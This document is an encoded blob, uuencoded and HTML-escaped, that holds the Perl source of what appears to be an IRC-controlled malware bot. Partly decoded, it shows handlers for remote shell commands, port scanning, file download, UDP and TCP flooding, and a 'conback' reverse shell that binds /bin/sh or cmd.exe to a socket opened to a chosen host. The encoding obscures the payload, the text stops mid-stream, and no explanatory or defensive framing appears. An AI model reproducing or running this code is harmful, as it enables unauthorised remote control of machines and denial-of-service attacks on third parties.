@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!P87)S92![&quot;B`@(&amp;UY(&quot;1S97)V87)G(#T@&lt;VAI_9G0[&quot;B`@(&amp;EF(&quot;@D&lt;V5R=F%R9R`]?B`O7E!)3D&lt;@7#HH+BHI+RD@&gt;PH@(&quot;`@(&#x27;-E;F1R87&lt;H(E!/3D&lt;@.B0Q_(BD[&quot;B`@(&#x27;T@96QS:68@*&quot;1S97)V87)G(#U^(&quot;]&gt;7#HH+BL_*5PA*&quot;XK/RE&lt;0&quot;@N*S\\I(%!2259-4T&lt;@*&quot;XK_/RD@7#HH+BLI+RD@&gt;PH@(&quot;`@(&quot;`@;7D@)&#x27;!N/20Q.R!M&gt;2`D;VYD92`](&quot;0T.R!M&gt;2`D87)G&lt;R`](&quot;0U.PH@_(&quot;`@(&quot;`@:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,59%4E-)3TY&lt;,#`Q)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F]T:6-E*&quot;(D&lt;&amp;XB_+&quot;`B7#`P,59%4E-)3TX@;4E20R!V-BXQ-B!%3D4@04Q)3B!&#x27;04)2245,7#`P,2(I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@_(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,5!)3D=&lt;&lt;RLH7&amp;0K*5PP,#$D+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!N;W1I8V4H_(B1P;B(L(&quot;)&lt;,#`Q4$].1UPP,#$B*3L*(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;AG&lt;F5P(&#x27;LD7R`]?B`O7EQ1_)&#x27;!N7$4D+VD@?2!`861M&lt;RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;]N9&amp;4@97$@(B1M975N:6-K(BE[&quot;B`@(&quot;`@(&quot;`@_(&quot;`@&lt;VAE;&amp;PH(B1P;B(L(&quot;(D87)G&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^_(&quot;]&gt;*%Q1)&amp;UE=6YI8VM&lt;17Q&lt;421P&lt;F5F:7AO7$4I7&#x27;,K*&quot;XJ*2\\@*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1N871R_:7@@/2`D,3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;%R9R`](&quot;0R.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;%R9R`]?B`O7EPA_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I&lt;F-A&lt;V4H(B1P;B(L(B1O;F1E(BPB)#$B*2!U;FQE&lt;W,@*&quot;1N871R_:7@@97$@(B1P&lt;F5F:7AO(B!A;F0@)&amp;%R9R`]?B`O7EPA;FEC:R\\I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D_87)G(#U^(&quot;]&gt;7$`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;]N9&amp;5P(#T@)&amp;]N9&amp;4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`D;VYD97`@/2`D&lt;&amp;X@:68@)&amp;]N9&amp;4@97$@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!B9G5N8R@B_)&amp;]N9&amp;5P(BPB)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-H96QL*&quot;(D;VYD_92(L(&quot;(D87)G(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@?0H@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R_=F%R9R`]?B`O7EPZ*&quot;XK/RE&lt;(2@N*S\\I7$`H+BL_*5QS*TY)0TM&lt;&lt;RM&lt;.BA&lt;4RLI+VDI(&#x27;L*(&quot;`@(&quot;`@(&amp;EF_(&quot;AL8R@D,2D@97$@;&amp;,H)&amp;UE=6YI8VLI*2![&quot;B`@(&quot;`@(&quot;`@(&quot;1M975N:6-K/20T.PH@(&quot;`@(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;!]&quot;B`@(&#x27;T@96QS_:68@*&quot;1S97)V87)G(#U^(&amp;TO7EPZ*&quot;XK/RE&lt;&lt;RLT,S,O:2D@&gt;PH@(&quot;`@(&quot;`@)&amp;UE=6YI8VL@/2!G971N:6-K_*&quot;D[&quot;B`@(&quot;`@(&quot;!N:6-K*&quot;(D;65U;FEC:R(I.PH@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R=F%R9R`]?B!M+UY&lt;.B@N*S\\I_7&#x27;,K,#`Q7&#x27;,K*%Q3*RE&lt;&lt;R]I*2![&quot;B`@(&quot;`@(&quot;`D;65U;FEC:R`](&quot;0R.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S_&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VYI8VLG?2`](&quot;1M975N:6-K.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)4D-?_8W5R7W-O8VME=&#x27;U[)VYO;64G?2`](&quot;(D,2([&quot;B`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1C86YA;&quot;`H0&amp;-A;F%I&lt;RD@_&gt;PH@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)*3TE.(&quot;1C86YA;&quot;(I.PH@(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!B9G5N8R![_&quot;B`@;7D@)&#x27;!R:6YT;&quot;`](&quot;1?6S!=.PH@(&amp;UY(&quot;1F=6YC87)G(#T@)%];,5T[&quot;B`@:68@*&amp;UY(&quot;1P:60@/2!F_;W)K*2![&quot;B`@(&quot;`@=V%I=&#x27;!I9&quot;@D&lt;&amp;ED+&quot;`P*3L*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!I9B`H9F]R:RD@&gt;PH@(&quot;`@_(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYP;W)T&lt;V-A_;B`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;!O&lt;G1A_&lt;STH(C(Q(BPB,C(B+&quot;(R,R(L(C(U(BPB-3,B+&quot;(X,&quot;(L(C$Q,&quot;(L(C$T,R(L(C8V-C4B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A+&quot;`E&lt;&amp;]R=&amp;%?8F%N;F5R*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;9O&lt;F5A8V@@;7D@)&#x27;!O&lt;G1A_(&quot;A`&lt;&amp;]R=&amp;%S*2`@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;-C86YS;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^_;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T:7`L(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I_;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&#x27;-C86YS;V-K*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!P=7-H(&quot;A`86)E&lt;G1A+&quot;`D&lt;&amp;]R=&amp;$I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-C86YS;V-K+3YC;&amp;]S93L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A*2![&quot;B`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I0;W)T87,@_86)E&lt;G1A&lt;SH@0&amp;%B97)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D_9G5N8V%R9R`]?B`O7F1O=VYL;V%D7&#x27;,K*&quot;XJ*5QS*R@N*BDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;=E=&#x27;-T;W)E*&quot;(D_,2(L(&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z1&amp;]W;FQO860@9&amp;4@)#(@*&quot;0Q*2!#;VYC;&#x27;4N9&amp;\\A(BD@:68@*&quot;1E&lt;W1A=&amp;ES=&amp;EC87,I.PH@(&quot;`@(&quot;`@_(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N8V%R9R`]?B`O7F9U;&amp;QP;W)T&lt;V-A;EQS*R@N*BE&lt;&lt;RLH_7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1N86UE/2(D,2([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M_&gt;2`D&lt;&amp;]R=&amp;%I;FEC:6%L(#T@(B0R(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T869I;F%L(#T@(B0S(CL*(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A&lt;RP@)7!O&lt;G1A7V)A;FYE&lt;BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY_(&quot;1P;W)T82`H)&#x27;!O&lt;G1A:6YI8VEA;&quot;XN)&#x27;!O&lt;G1A9FEN86PI&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1S8V%N&lt;V]C:R`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0965R061D&lt;B`]/B`D:&amp;]S=&amp;YA;64L_(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;EF(&quot;@D&lt;V-A;G-O8VLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!P=7-H(&quot;A`86)E&lt;G1A&lt;RP@)&#x27;!O&lt;G1A*3L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;V-A;G-O8VLM/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D97-T871I_&lt;W1I8V%S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@_)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;$@)&#x27;!O&lt;G1A(&amp;%B97)T82!E;2`D:&amp;]S=&amp;YA;64B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A&lt;RD@&gt;PH@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;%S_(&amp;%B97)T87,Z($!A8F5R=&amp;%S(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@(&quot;`@96QS:68@_*&quot;1F=6YC87)G(#U^(&quot;]&gt;=61P7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D&lt;&amp;%C;W1E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H5&#x27;(P&gt;&quot;P@4$9?24Y%5&quot;P@4T]#2U]$_1U)!32P@,3&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O/6EN971?871O;B@B)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!M&gt;2`D&lt;&amp;]R=&amp;$@/2`B)#(B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1T96UP;R`](&quot;(D,R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@;7D@)&#x27;!A8V]T93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E&lt;V4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;9I_;2`](&#x27;1I;64@*R`D=&amp;5M&lt;&amp;\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A8V]T82`](#$[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_=VAI;&amp;4@*&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@)B8@*&quot;1P86-O=&amp;5S(#T](&quot;(Q(BDI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;1P86-O=&amp;$@/2`P(&amp;EF(&quot;@H=&amp;EM92`^/2`D9FEM*2`F)B`H)&#x27;1E;7!O(&quot;$](&quot;(P(BDI.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;&amp;]R=&amp;$@/2!I_;G0H&lt;F%N9&quot;`V-3`P,&quot;D@*S$@:68@*&quot;1P;W)T82`]/2`B,&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&quot;A4&lt;C!X_+&quot;`P+&quot;`D&lt;&amp;%C;W1E+&quot;!S;V-K861D&lt;E]I;B@D&lt;&amp;]R=&amp;$L(&quot;1A;&#x27;9O*2D@86YD(&quot;1P86-O=&amp;5S92LK(&amp;EF(&quot;@D_&lt;&amp;%C;W1E&lt;R`]/2`B,2(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A_&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))_5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;5M&lt;&amp;\\@9&amp;4@4&amp;%C;W1E&lt;UPP,#(Z(&quot;1T96UP;R(N(G,B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)4;W1A;&quot;!D92!0_86-O=&amp;5S7#`P,CH@)&#x27;!A8V]T97-E(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T_+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R06QV;R!D;W,@4&amp;%C;W1E&lt;UPP,#(Z(&quot;0Q(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYU9&#x27;!F86EX85QS_*R@N*BE&lt;&lt;RLH7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V]C:V5T*%1R,&#x27;@L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D9F%I&gt;&amp;%I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@;7D@)&#x27;1E;7!O(#T@(B0S(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;UY(&quot;1P86-O=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1F:6T@/2!T:6UE(&quot;L@)&#x27;1E;7!O.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1P86-O=&amp;$@/2`Q.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;=H:6QE_(&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T82`](#`@:68@*&quot;AT:6UE(#X](&quot;1F_:6TI(&quot;8F(&quot;@D=&amp;5M&lt;&amp;\\@(3T@(C`B*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W(@*&amp;UY(&quot;1F86EX82`](#$[(&quot;1F_86EX82`\\/2`R-34[(&quot;1F86EX82LK*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1A;&#x27;9O(#T@:6YE=%]A=&amp;]N*&quot;(D_9F%I&gt;&amp;%I&lt;&quot;XD9F%I&gt;&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A_;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;AR86YD(#8U,#`P*2`K,2!I9B`H)&#x27;!O&lt;G1A(#T]_(&quot;(P(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F0H5&#x27;(P&gt;&quot;P@,&quot;P@)&#x27;!A8V]T92P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O_&lt;G1A+&quot;`D86QV;RDI(&amp;%N9&quot;`D&lt;&amp;%C;W1E&lt;V4K*R!I9B`H)&#x27;!A8V]T97,@/3T@(C$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@:68@*&quot;1F86EX82`^/2`R-34I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D9F%I&gt;&amp;$@/2`Q.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;EF(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#_7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)496UP;R!D92!086-O=&amp;5S7#`P,CH@)&#x27;1E;7!O_(BXB&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z7#`P,E1O=&amp;%L(&amp;1E(%!A8V]T97-&lt;,#`R.B`D&lt;&amp;%C;W1E&lt;V4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A_=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)!;&#x27;9O(&amp;1O&lt;R!086-O=&amp;5S7#`P,CH@_)&amp;%L=F\\B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N_8V%R9R`]?B`O7F-O;F)A8VM&lt;&lt;RLH+BHI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W0@/2`B_)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!R;W1O(#T@_9V5T&lt;&#x27;)O=&amp;]B&gt;6YA;64H)W1C&lt;&quot;&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1I861D&lt;B`](&amp;EN971?871O;B@D:&amp;]S_=&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A9&amp;1R(#T@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D9&#x27;(I.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1S:&amp;5L;&quot;`](&quot;(O8FEN+W-H(&quot;UI(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)%Y/(&amp;5Q(&quot;)-_4U=I;C,R(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-H96QL(#T@(F-M9&quot;YE&gt;&amp;4B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2T54+&quot;!01E])3D54+&quot;!33T-+7U-44D5!32P@)&#x27;!R;W1O*2!O&lt;B!D_:64@(G-O8VME=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-O;FYE8W0H4T]#2T54+&quot;`D&lt;&amp;%D9&#x27;(I(&amp;]R(&amp;1I92`B_8V]N;F5C=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;]P96XH4U1$24XL(&quot;(^)E-/0TM%5&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;]P96XH4U1$3U54+&quot;`B/B933T-+150B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-41$524BP@(CXF4T]#_2T54(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;WES=&amp;5M*&quot;(D&lt;VAE;&amp;PB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1)_3BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4U1$3U54*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1%4E(I.PH*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R0V]N96-T86YD;RUS92!E_;5PP,#(Z(&quot;1H;W-T.B1P;W)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@_(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYO;&amp;1P86-K7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`H)&amp;1T:6UE+&quot;`E&lt;&amp;%C;W1E_&lt;RD@/2!A=&#x27;1A8VME&lt;B@B)#$B+&quot;`B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1D=&amp;EM92`](#$@:68@)&amp;1T_:6UE(#T](#`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`E8GET97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D8GET97-[:6=M&lt;&#x27;T@/2`D_,B`J(&quot;1P86-O=&amp;5S&gt;VEG;7!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;)Y=&amp;5S&gt;VEC;7!](#T@)#(@*B`D&lt;&amp;%C;W1E&lt;WMI_8VUP?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMO?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[;WT[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D_8GET97-[=61P?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[=61P?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMT8W!](#T@)#(@_*B`D&lt;&amp;%C;W1E&lt;WMT8W!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=6YL97-S(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@&gt;PH@(